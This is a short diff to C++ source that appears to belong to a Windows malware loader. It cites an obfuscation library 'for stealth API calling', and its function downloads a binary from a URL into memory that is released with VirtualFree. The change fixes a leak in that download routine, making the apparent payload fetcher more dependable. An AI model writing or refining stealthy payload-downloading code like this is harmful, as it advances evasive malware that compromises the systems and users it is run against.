@@ -1,6 +1,7 @@
 #include "../include/http_client.h"
 #include "../include/json.hpp"
 #include "../include/encryption.h"
+#include "../include/util.h"      // allocate_buffer()
 #include <iostream>
 
 // Include Obfusk8 for stealth API calling
@@ -238,9 +239,14 @@ BYTE* downloadBinaryFromUrl(const std::wstring& url, size_t& outSize, int useSSL
     _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession);
 
     if (buffer.empty()) { outSize = 0; return nullptr; }
+
+    // allocate_buffer() so the caller's free_buffer()/VirtualFree() can actually
+    // release this; a new[] here silently leaked the whole download.
+    BYTE* result = allocate_buffer(buffer.size());
+    if (!result) { outSize = 0; return nullptr; }
+
+    memcpy(result, buffer.data(), buffer.size());
     outSize = buffer.size();
-    BYTE* result = new BYTE[outSize];
-    memcpy(result, buffer.data(), outSize);
     return result;
 }
 
